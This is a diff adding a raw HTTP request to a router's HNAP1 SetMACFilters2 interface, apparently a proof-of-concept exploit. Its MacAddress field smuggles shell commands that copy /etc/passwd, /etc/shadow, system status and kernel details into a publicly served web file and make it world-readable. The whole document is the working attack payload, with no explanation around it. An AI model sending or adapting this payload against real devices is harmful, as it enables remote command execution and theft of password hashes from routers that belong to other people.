@@ -1,0 +1,10 @@
+POST /HNAP1/ HTTP/1.1
+Host: 192.168.0.1
+Content-Type: text/xml; charset=utf-8
+Content-Length: 760
+SOAPAction: "http://purenetworks.com/HNAP1/SetMACFilters2"
+HNAP_AUTH: 6016966180BCE91B7D8D6E0AB08DFD8F 1795256065
+Cookie: uid=i278ev9
+Connection: close
+
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetMACFilters2 xmlns="http://purenetworks.com/HNAP1/"><Enabled>true</Enabled><IsAllowList>false</IsAllowList><MACList><MACInfo><MacAddress>00:11:22:33:44:55;cat /proc/self/status>/var/htdocs/upnp/LAN-1/r09_evidence.gif;uname -a>>/var/htdocs/upnp/LAN-1/r09_evidence.gif;cat /etc/passwd>>/var/htdocs/upnp/LAN-1/r09_evidence.gif;cat /etc/shadow>>/var/htdocs/upnp/LAN-1/r09_evidence.gif;chmod 644 /var/htdocs/upnp/LAN-1/r09_evidence.gif;#</MacAddress><DeviceName>i278</DeviceName></MACInfo></MACList></SetMACFilters2></soap:Body></soap:Envelope>
